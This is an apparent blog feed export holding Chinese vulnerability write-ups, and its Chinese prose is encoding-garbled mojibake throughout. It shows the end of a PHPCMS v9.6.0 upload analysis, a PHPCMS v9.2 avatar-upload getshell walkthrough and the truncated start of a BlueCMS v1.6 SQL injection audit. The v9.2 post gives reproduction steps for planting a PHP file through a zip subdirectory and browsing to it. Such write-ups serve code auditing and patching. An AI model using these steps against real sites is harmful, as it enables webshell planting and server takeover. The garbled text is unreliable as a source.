ä¸ºç”¨æˆ·åå’Œé‚®ç®±ä¸å”¯ä¸€å¯¼è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬payloadå°½é‡è¦éšæœº</p><p>å¦å¤–åœ¨ phpsso æ²¡æœ‰é…ç½®å¥½çš„æ—¶å€™<code>$status</code>çš„å€¼ä¸ºç©ºï¼Œä¹ŸåŒæ ·ä¸èƒ½å¾—åˆ°è·¯å¾„</p><p>åœ¨æ— æ³•å¾—åˆ°è·¯å¾„çš„æƒ…å†µä¸‹æˆ‘ä»¬åªèƒ½çˆ†ç ´äº† ï¼Œæ–‡ä»¶åçš„ç”Ÿæˆæ–¹æ³•(åœ¨<code>phpcms/libs/classes/attachment.class.php</code>)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210314213759469.png" alt="image-20210314213759469"></p><p>è¿”å›çš„æ–‡ä»¶åä¹Ÿåªæ˜¯æ—¶é—´+éšæœºçš„ä¸‰ä½æ•°ã€‚æ¯”è¾ƒå®¹æ˜“çˆ†ç ´çš„ã€‚</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>åœ¨phpcms9.6.1ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œä¿®å¤æ–¹æ¡ˆå°±æ˜¯å¯¹ç”¨<code>fileext</code>è·å–åˆ°çš„æ–‡ä»¶åç¼€å†ç”¨é»‘ç™½åå•åˆ†åˆ«è¿‡æ»¤ä¸€æ¬¡</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210207093004450.png" alt="img-end"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHPCMS-V9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#PHPCMS-V9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ</title>
    <link href="https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-06T11:10:11.000Z</published>
    <updated>2021-03-16T05:29:35.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPCMS-V9-2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ"><a href="#PHPCMS-V9-2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ" class="headerlink" title="PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ"></a>PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ</h1><h2 id="ä»‹ç»-amp-é¢„å¤‡çŸ¥è¯†"><a href="#ä»‹ç»-amp-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="ä»‹ç»&amp;é¢„å¤‡çŸ¥è¯†"></a>ä»‹ç»&amp;é¢„å¤‡çŸ¥è¯†</h2><p><strong>ä»‹ç»</strong>ï¼šPHPCMSæ˜¯ä¸€æ¬¾ç½‘ç«™ç®¡ç†è½¯ä»¶ã€‚è¯¥è½¯ä»¶é‡‡ç”¨æ¨¡å—åŒ–å¼€å‘,æ”¯æŒå¤šç§åˆ†ç±»æ–¹å¼ã€‚</p><h3 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h3><p>PHPCMSæ˜¯é‡‡ç”¨<font color="red">MVCè®¾è®¡</font>æ¨¡å¼å¼€å‘,åŸºäºæ¨¡å—å’Œæ“ä½œçš„æ–¹å¼è¿›è¡Œè®¿é—®ï¼Œé‡‡ç”¨å•ä¸€å…¥å£æ¨¡å¼è¿›è¡Œé¡¹ç›®éƒ¨ç½²å’Œè®¿é—®ï¼Œæ— è®ºè®¿é—®ä»»ä½•ä¸€ä¸ªæ¨¡å—æˆ–è€…åŠŸèƒ½ï¼Œåªæœ‰ä¸€ä¸ªç»Ÿä¸€çš„å…¥å£ã€‚</p><table><thead><tr><th>å‚æ•°åç§°</th><th>æè¿°</th><th>ä½ç½®</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>m</td><td>æ¨¡å‹/æ¨¡å—åç§°</td><td><code>phpcms/modulesä¸­æ¨¡å—ç›®å½•åç§°</code></td><td>å¿…é¡»</td></tr><tr><td>c</td><td>æ§åˆ¶å™¨åç§°</td><td><code>phpcms/modules/æ¨¡å—/*.php æ–‡ä»¶åç§°</code></td><td>å¿…é¡»</td></tr><tr><td>a</td><td>äº‹ä»¶åç§°</td><td><code>phpcms/modules/æ¨¡å—/*.php ä¸­æ–¹æ³•åç§°</code></td><td></td></tr></tbody></table><p>æ¨¡å—è®¿é—®æ–¹æ³•[ç¤ºä¾‹]ï¼š<br><code>http://www.xxx.com/index.php?m=content&amp;c=index&amp;a=show&amp;id=1</code><br>å…¶ä¸­<br><code>m = content</code> ä¸ºæ¨¡å‹/æ¨¡å—åç§° ä½äº<strong>phpcms/modules/content</strong><br><code>c = index</code> ä¸ºæ§åˆ¶å™¨åç§° ä½äº<strong>phpcms/modules/content/index.php</strong><br><code>a = show</code> ä¸ºæ—¶é—´åç§° ä½äº<strong>phpcms/modules/content/index.php</strong>ä¸­<code>show()</code>æ–¹æ³•<br>id = 1 ä¸ºå…¶ä»–å‚æ•° ä¸æ­£å¸¸getä¼ é€’å‚æ•°å½¢å¼ç›¸åŒ</p><p>è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è®¿é—®<code>http://www.xxx.com/index.php</code></p><p>phpcmsé»˜è®¤è·¯ç”±ä¼šå®šä½åˆ°contentæ¨¡å—çš„indexæ§åˆ¶å™¨ä¸­çš„<code>init</code>æ“ä½œï¼Œå› ä¸ºç³»ç»Ÿåœ¨æ²¡æœ‰æŒ‡å®šæ¨¡å—å’Œæ§åˆ¶å™¨çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œé»˜è®¤çš„æ¨¡å—å’Œæ“ä½œ.</p><p>æ‰€ä»¥è·Ÿè®¿é—®<code>http://www.xxx.com/index.php?m=content&amp;c=index&amp;a=init</code>æ˜¯ä¸€æ ·çš„</p><blockquote><p>å‚è€ƒæ¥æºï¼š<a href="http://www.sjzphp.com/webdis/router_url_907.html">http://www.sjzphp.com/webdis/router_url_907.html</a></p></blockquote><h2 id="ç¯å¢ƒæ­å»º-amp-æ‰€éœ€å·¥å…·"><a href="#ç¯å¢ƒæ­å»º-amp-æ‰€éœ€å·¥å…·" class="headerlink" title="ç¯å¢ƒæ­å»º&amp;æ‰€éœ€å·¥å…·"></a>ç¯å¢ƒæ­å»º&amp;æ‰€éœ€å·¥å…·</h2><ul><li>phpstudy2018<ul><li><code>php-5.4.45-nts + Apache</code></li></ul></li><li>PHPCMS_V9.2</li><li>Burpsuite</li></ul><p>æµ‹è¯•ç«™ç‚¹ç½‘å€ï¼š<code>www.phpcms92.com</code></p><p>è®¿é—®<code>/install/install.php</code>æ–‡ä»¶è¿›è¡Œå®‰è£…ï¼Œä¸‹ä¸€æ­¥</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309190648469.png" alt="image-20210309190648469"></p><p>ä¸‹ä¸€æ­¥ï¼Œé…ç½®ç›¸å…³ä¿¡æ¯</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309190734311.png" alt="image-20210309190734311"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309190817357.png" alt="image-20210309190817357"></p><p>å®‰è£…å®Œæˆï¼ï¼ï¼</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è®¿é—®é¦–é¡µ<code>index.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309190919710.png" alt="image-20210309190919710"></p><p>æ³¨å†Œä¸€ä¸ªè´¦æˆ·(è¿™é‡Œæˆ‘ä»¥Taoè¿™ä¸ªæ™®é€šç”¨æˆ·è¿›è¡Œæ¼”ç¤º)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309190947022.png" alt="image-20210309190947022"></p><p>åˆ°ä¸ªäººä¸»é¡µä¿®æ”¹å¤´åƒå¤„ï¼Œä¸Šä¼ å¤´åƒ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309191442679.png" alt="image-20210309191442679"></p><p>åœ¨æ­¤ä¹‹å‰ï¼Œè¿˜è¦å‡†å¤‡ä¸€ä¸ªåç¼€ä¸º<code>zip</code>çš„å‹ç¼©åŒ…ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309191233718.png" alt="image-20210309191233718"></p><blockquote><p>phpæ–‡ä»¶éœ€è¦æ”¾åœ¨äºŒå±‚ç›®å½•ä¸‹ç„¶åå†è¿›è¡Œå‹ç¼©</p></blockquote><p>ä¸Šä¼ å¤´åƒç…§ç‰‡ï¼ˆBurpæŠ“åŒ…ï¼‰-&gt;ä¿å­˜å›¾ç‰‡</p><p>å°†ä¹‹å‰çš„å›¾ç‰‡æ•°æ®åˆ é™¤</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309193312286.png" alt="image-20210309193312286"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309193339943.png" alt="image-20210309193339943"></p><p>å°†<code>Tao.zip</code>ä¸­æ•°æ®ï¼ŒæŒ‰ç…§ä¸Šå›¾çš„æ“ä½œæ·»åŠ è‡³è¯·æ±‚ä¸­ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹å›¾ã€‚ç„¶åæ”¾è¡Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309193358488.png" alt="image-20210309193358488"></p><p>è®¿é—®<code>phpsso_server/uploadfile/avatar/1/1/1/dir/404.php</code>ï¼ˆè¿™é‡Œçš„<code>1</code>æ˜¯æ³¨å†Œåç”¨æˆ·çš„idï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309193457813.png" alt="image-20210309193457813"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¯´ä¸€ä¸‹æ¼æ´å­˜åœ¨å¤„çš„åŠŸèƒ½ï¼Œæ‰§è¡Œæµç¨‹ï¼Œä»¥åŠæ¼æ´äº§ç”Ÿçš„åŸå› ã€‚</p><p>åœ¨ç¼–è¾‘å¤´åƒå¤„ï¼Œæˆ‘ä»¬ä¸Šä¼ å¤´åƒï¼Œå‰ç«¯ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œåˆ†å‰²æˆä¸‰å¼ (ä¸‰ä¸ªå°ºå¯¸å¤§å°)ã€‚ç„¶åå‰ç«¯æ‰“åŒ…å‹ç¼©æˆzipæ•°æ®ï¼Œ<font color="red">å½“æˆ‘ä»¬ä¿å­˜å›¾ç‰‡æ—¶</font>ï¼Œæˆ‘ä»¬çš„å‹ç¼©åŒ…æ•°æ®ä¼šä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡<code>uploadavatar</code>å‡½æ•°è¿›è¡Œå¤„ç†(å‡½æ•°åœ¨æ–‡ä»¶<code>phpsso_server/phpcms/modules/phpsso/index.php</code>)ï¼›è€Œè¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹å°±æ˜¯ï¼š</p><ol><li>åœ¨ä¿å­˜ä¸Šä¼ å¤´åƒæ–‡ä»¶å¤¹å¤„ï¼Œåˆ›å»ºä¸€ä¸ªè·Ÿç”¨æˆ·idå¯¹åº”çš„æ–‡ä»¶å¤¹</li><li>å°†å‰ç«¯æ‰“åŒ…çš„å‹ç¼©åŒ…é€šè¿‡postä¼ æ¥çš„æ•°æ®è¿›è¡Œä¿å­˜ï¼Œä¿å­˜åä¸ºç”¨æˆ·idçš„zipæ–‡ä»¶</li><li>è§£å‹æ•°æ®åŒ…</li><li>åˆ¤æ–­æœªåœ¨æ•°ç»„å†…æ–‡ä»¶åå‘½åçš„<font color="red">æ–‡ä»¶</font>ï¼Œä¸æ˜¯åˆ™é€šè¿‡<code>unlink</code>å‡½æ•°éå†åˆ é™¤</li></ol><p>ä¸Šé¢æµç¨‹å­˜åœ¨é—®é¢˜çš„åœ°æ–¹æœ‰ï¼Œ1.æœªå¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œå¤„ç†ï¼Œ2.è§£å‹éå†åˆ é™¤ä½¿ç”¨çš„æ˜¯<code>unlink</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åªèƒ½åˆ é™¤æ–‡ä»¶ï¼Œä¸èƒ½åˆ é™¤æ–‡ä»¶å¤¹ã€‚å› ä¸ºè¿™ä¸€åŸå› ï¼Œæˆ‘ä»¬åªéœ€å°†å‹ç¼©åŒ…æ–‡ä»¶é‡Œå¸¦ä¸€ä¸ªç›®å½•ï¼Œç›®å½•é‡Œå¸¦æ¶æ„æ–‡ä»¶ï¼Œå³å¯ç»•è¿‡ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210310163059145.png" alt="image-20210310163059145"></p><p>å›¾ç‰‡å¤„ç†è¯·æ±‚ä¸º<code>/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar</code></p><p>å®šä½æ–‡ä»¶<code>phpsso_server/phpcms/modules/phpsso/index.php</code>572è¡Œ</p><blockquote><p>ä¸ºä»€ä¹ˆå®šä½åˆ°è¿™ï¼Œå¼€å¤´ä»‹ç»æœ‰è¯´</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309194258881.png" alt="image-20210309194258881"></p><p>è°ƒè¯•ï¼Œå‘ä¸‹æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadavatar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¹æ®ç”¨æˆ·idåˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;uid&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;avatardata&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;uid = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;avatardata = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;avatardata&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309194703292.png" alt="image-20210309194703292"></p><p>å¯ä»¥å‘ç°<code>$this-&gt;data[&#39;avatardata&#39;]</code>å˜é‡å­˜å‚¨ç€æˆ‘ä»¬ä¸Šä¼ ä¿®æ”¹çš„æ•°æ®ï¼ˆæ¶æ„ï¼‰</p><p>è€Œ<code>$this-&gt;data[&#39;avatardata&#39;]</code>æ˜¯é€šè¿‡ä¼ªåè®®è·å–çš„(æ–‡ä»¶ä¸ºphpsso_server/phpcms/modules/phpsso/classes/phpsso.class.php)ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$postStr = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($postStr) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;avatardata&#x27;</span>] = $postStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­å‘ä¸‹èµ°ï¼Œæ–°å»ºå­˜æ”¾å›¾ç‰‡ç›®å½•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309194942502.png" alt="image-20210309194942502"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºå›¾ç‰‡å­˜å‚¨æ–‡ä»¶å¤¹</span></span><br><span class="line">$avatarfile = pc_base::load_config(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;upload_path&#x27;</span>).<span class="string">&#x27;avatar/&#x27;</span>;</span><br><span class="line">$dir = $avatarfile.$dir1.<span class="string">&#x27;/&#x27;</span>.$dir2.<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span>-&gt;uid.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir)) &#123;</span><br><span class="line">    mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $dir.<span class="keyword">$this</span>-&gt;uid.<span class="string">&#x27;.zip&#x27;</span>;</span><br><span class="line">file_put_contents($filename, <span class="keyword">$this</span>-&gt;avatardata);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ç¬¬äº”è¡Œåˆ›å»ºç›®å½•ã€‚ä¹‹åè¿›è¡Œæ–°å‘½åå‹ç¼©åŒ…ï¼Œåä¸ºç”¨æˆ·idå€¼ã€‚ç„¶åå°†æˆ‘ä»¬ä¸Šé¢é€šè¿‡ä¼ªåè®®è·å–çš„æ•°æ®è¿›è¡Œå†™å…¥</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309195507871.png" alt="image-20210309195507871"></p><p>å¦‚ä¸‹å›¾ï¼Œå¯ä»¥å‘ç°ï¼Œæ–°å»ºäº†<code>1.zip</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309195911863.png" alt="image-20210309195911863"></p><p>å‹ç¼©åŒ…å†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯æˆ‘ä»¬ä¿®æ”¹ä¸Šä¼ çš„æ•°æ®</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210310173149661.png" alt="image-20210310173149661"></p><p>ä¹‹åè§£å‹ç¼©ã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200054842.png" alt="image-20210309200054842"></p><p>èµ°åˆ°éå†ç™½åå•åˆ¤æ–­æ–‡ä»¶ï¼Œæ’é™¤<code>.</code>ï¼ˆå½“å‰ç›®å½•ï¼‰<code>..</code>ï¼ˆä¸Šçº§ç›®å½•ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200223331.png" alt="image-20210309200223331"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200237815.png" alt="image-20210309200237815"></p><p>ä¸‹å›¾åˆ é™¤äº†å‹ç¼©åŒ…æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200313435.png" alt="image-20210309200313435"></p><p>ç»§ç»­æ‰§è¡Œï¼Œå½“åˆ¤æ–­åˆ°<code>dir</code>ç›®å½•æ—¶ï¼Œå› ä¸º<code>dir</code>ç›®å½•ä¸å±äºæ•°ç»„é‡Œï¼ˆç™½åå•ï¼‰ï¼Œç„¶åæ‰§è¡Œ<code>unlink(dirç›®å½•)</code>ã€‚ç”±äº<code>unlink</code>å‡½æ•°åªèƒ½åˆ é™¤æ–‡ä»¶ï¼Œæ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥å°±ç•™ä¸‹äº†æ¶æ„ä»£ç æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200455153.png" alt="image-20210309200455153"></p><p>æ¥ç€è·³å‡ºäº†ifè¯­å¥ï¼Œç»§ç»­æ‰§è¡Œï¼Œå°†ä¿¡æ¯æ›´æ–°è‡³æ•°æ®åº“</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210309200514238.png" alt="image-20210309200514238"></p><p>æ‰€ä»¥ï¼Œæ¼æ´äº§ç”Ÿçš„åŸå› å°±æ˜¯<code>unlink</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array($file, $avatararr)) &#123;</span><br><span class="line">@unlink($dir.$file);<span class="comment">// æ¼æ´äº§ç”Ÿçš„åŸå› </span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210310234923955.png" alt="image-20210310234923955"></p><p>å› ä¸º<code>unlink</code>æ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢åˆ©ç”¨çš„å‹ç¼©åŒ…é‡Œçš„æ¶æ„ä»£ç æ–‡ä»¶éœ€è¦æ”¾åœ¨ç›®å½•ä¸‹</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li>ä¸ä½¿ç”¨zipå‹ç¼©åŒ…å¤„ç†å›¾ç‰‡æ–‡ä»¶</li><li>ä½¿ç”¨æœ€æ–°ç‰ˆçš„phpcms</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHPCMS-V9-2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#PHPCMS-V9-2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6</title>
    <link href="https://taonn.github.io/2021/02/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BBlueCMS-V1-6/"/>
    <id>https://taonn.github.io/2021/02/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BBlueCMS-V1-6/</id>
    <published>2021-02-02T13:35:01.000Z</published>
    <updated>2021-03-16T05:29:54.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6"><a href="#ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6" class="headerlink" title="ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6"></a>ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6</h1><h2 id="æ¼æ´ç¯å¢ƒ-amp-æ­å»º"><a href="#æ¼æ´ç¯å¢ƒ-amp-æ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒ&amp;æ­å»º"></a>æ¼æ´ç¯å¢ƒ&amp;æ­å»º</h2><p>æœ¬åœ°ç¯å¢ƒæ­å»ºï¼Œä½¿ç”¨phpstudyé›†æˆç³»ç»Ÿï¼ŒCMSç‰ˆæœ¬ä¸º<code>BlueCMS_v1.6</code></p><p>è®¿é—®<code>install</code>ç›®å½•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228100246267.png" alt="image-20210228100246267"></p><p>ä¸‹ä¸€æ­¥ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶æœ‰æ²¡æœ‰ç”Ÿæˆ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228100419373.png" alt="image-20210228100419373"></p><p>å®‰è£…æˆåŠŸï¼</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¸¢è¿›seayé‡Œé¢ï¼ˆæ–°å»ºé¡¹ç›®-&gt;é€‰æ‹©bluecmså®‰è£…ç›®å½•-&gt;è‡ªåŠ¨å®¡è®¡-&gt;å¼€å§‹ï¼‰</p><h3 id="æ•°å­—å‹SQLæ³¨å…¥"><a href="#æ•°å­—å‹SQLæ³¨å…¥" class="headerlink" title="æ•°å­—å‹SQLæ³¨å…¥"></a>æ•°å­—å‹SQLæ³¨å…¥</h3><p>äº§ç”Ÿæ­¤æ¼æ´çš„æ–‡ä»¶ä¸º<code>ad_js.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228103753924.png" alt="image-20210228103753924"></p><p>seayæ˜¾ç¤º19è¡Œçš„<code>$ad_id</code>å˜é‡å­˜åœ¨sqlæ³¨å…¥ï¼Œè€Œå˜é‡<code>$ad_idæ˜¯</code>ä»<code>$_GET[&#39;ad_id&#39;]</code>ä¸­æ¥çš„,ä¸”åªç»è¿‡äº†<code>trim</code>ã€‚</p><blockquote><p> <code>trim()</code>ï¼šå‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</p></blockquote><p>è€Œåœ¨ad_js.phpæ–‡ä»¶çš„å¼€å¤´ï¼ˆç¬¬10è¡Œï¼‰å¼•å…¥äº†è¿‡æ»¤æ–‡ä»¶<code>require_once dirname(__FILE__) . &#39;/include/common.inc.php&#39;;</code></p><p>æŸ¥çœ‹<code>common.inc.php</code>æ–‡ä»¶, å‘ç°å¯¹<code>$_POST</code>,<code>$_GET</code>,<code>$_COOKIE</code>,<code>$_REQUEST</code>ä¼ é€’çš„å‚æ•°éƒ½è¿›è¡Œäº†è¿‡æ»¤</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228105725166.png" alt="image-20210228105725166"></p><p>è·Ÿè¸ªçœ‹çœ‹<code>deep_addslashes</code>æ˜¯æ€ä¹ˆå®ç°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>($str <span 